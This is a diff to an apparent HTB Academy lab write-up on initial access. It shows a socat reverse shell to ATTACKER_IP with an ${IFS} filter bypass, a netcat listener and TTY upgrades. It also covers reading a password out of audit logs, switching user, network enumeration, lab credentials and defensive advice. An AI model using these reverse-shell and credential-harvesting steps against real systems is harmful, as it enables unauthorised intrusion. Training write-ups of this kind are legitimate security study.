@@ -1,4 +1,4 @@
-# Initial Access
+# 🚀 Initial Access
 
 ## 🎯 Overview
 
@@ -7,6 +7,7 @@
 ## 🚀 Reverse Shell Establishment
 
 ### 🔧 Socat Reverse Shell (Filter Bypass)
+
 ```bash
 # Base socat command (filtered):
 socat TCP4:ATTACKER_IP:PORT EXEC:/bin/bash
@@ -21,6 +22,7 @@ ${IFS}      # Environment variable for space bypass
 ```
 
 ### 🎧 Listener Setup
+
 ```bash
 # Start netcat listener
 nc -nvlp 8443
@@ -33,6 +35,7 @@ uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
 ## 🔄 TTY Upgrade Process
 
 ### 🛠️ Socat Interactive Terminal
+
 ```bash
 # 1. Start socat listener on attacker
 socat file:`tty`,raw,echo=0 tcp-listen:4443
@@ -46,6 +49,7 @@ uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
 ```
 
 ### 🐍 Alternative Python TTY
+
 ```bash
 # Standard Python upgrade method
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -60,6 +64,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ## 🔍 Privilege Escalation Discovery
 
 ### 📋 Audit Log Analysis
+
 ```bash
 # Group membership analysis
 id
@@ -75,6 +80,7 @@ aureport --tty | less
 ```
 
 ### 🔐 Credential Extraction from Logs
+
 ```bash
 # TTY Report analysis:
 # date time event auid term sess comm data
@@ -89,6 +95,7 @@ srvadm:ILFreightnixadm!
 ```
 
 ### 🔺 User Escalation
+
 ```bash
 # Switch to srvadm user
 su srvadm
@@ -106,6 +113,7 @@ srvadm@dmz01:/var/www/html/monitoring$
 ## 🌐 Network Position Analysis
 
 ### 📊 Network Interface Discovery
+
 ```bash
 # Interface enumeration
 ifconfig
@@ -122,6 +130,7 @@ ens192: 172.16.8.120    # Internal network interface
 ```
 
 ### 🎯 Host Information
+
 ```bash
 # System identification
 hostname
@@ -143,6 +152,7 @@ netstat -antup
 ## 🔒 Persistence Preparation
 
 ### 🛡️ Access Maintenance Strategy
+
 ```bash
 # Current access chain:
 1. Command injection (monitoring app)
@@ -158,6 +168,7 @@ netstat -antup
 ```
 
 ### 📋 Next Steps Planning
+
 ```cmd
 # Immediate priorities:
 1. Root privilege escalation
@@ -176,6 +187,7 @@ netstat -antup
 ## 🎯 HTB Academy Lab
 
 ### 📋 Lab Solution Summary
+
 ```cmd
 # Attack chain execution:
 1. Web application brute force → admin:12qwaszx
@@ -195,6 +207,7 @@ netstat -antup
 ```
 
 ### 🔍 Learning Objectives
+
 ```cmd
 # Technical skills:
 - Command injection exploitation
@@ -218,6 +231,7 @@ netstat -antup
 ## 🛡️ Defensive Recommendations
 
 ### 🔒 Application Security
+
 ```cmd
 # Input validation:
 - Implement strict character whitelisting
@@ -236,4 +250,4 @@ netstat -antup
 - User privilege minimization
 - Service account management
 - Regular credential rotation
-``` 
+```
